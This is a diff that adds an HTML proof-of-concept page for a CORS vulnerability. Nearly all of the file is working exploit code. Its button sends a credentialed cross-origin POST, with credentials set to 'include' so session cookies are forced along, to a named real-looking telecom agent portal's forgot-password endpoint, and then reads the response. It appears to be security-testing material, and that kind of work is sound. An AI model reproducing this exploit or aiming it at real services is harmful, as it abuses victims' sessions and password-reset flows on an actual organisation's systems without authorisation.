@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Vulnerability Proof of Concept</title>
+</head>
+<body>
+    <h2>CORS Exploit Demonstration</h2>
+    <p>Status: <span id="status">Waiting for action...</span></p>
+    <button onclick="sendCorsRequest()">Execute Exploit Request</button>
+
+    <script>
+        function sendCorsRequest() {
+            // Replace with your target endpoint URL
+            const targetUrl = "https://ncelldms.ncell.com.np/api/agnt-ms/agents/forgot-password";
+
+            // Payload for the POST request (adjust based on what the endpoint expects)
+            const requestData = {
+                email: "victim@example.com"
+            };
+
+            document.getElementById("status").innerText = "Sending cross-origin request...";
+
+            fetch(targetUrl, {
+                method: "POST", // Matching the allowed method you found
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(requestData),
+                credentials: "include" // CRITICAL: Forces the browser to send cookies/session tokens cross-origin
+            })
+            .then(response => {
+                document.getElementById("status").innerText = "Response received! Status: " + response.status;
+                return response.text();
+            })
+            .then(data => {
+                console.log("Response Body:", data);
+                alert("Success! Check your browser console to view the response data.");
+            })
+            .catch(error => {
+                document.getElementById("status").innerText = "Request failed.";
+                console.error("CORS Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
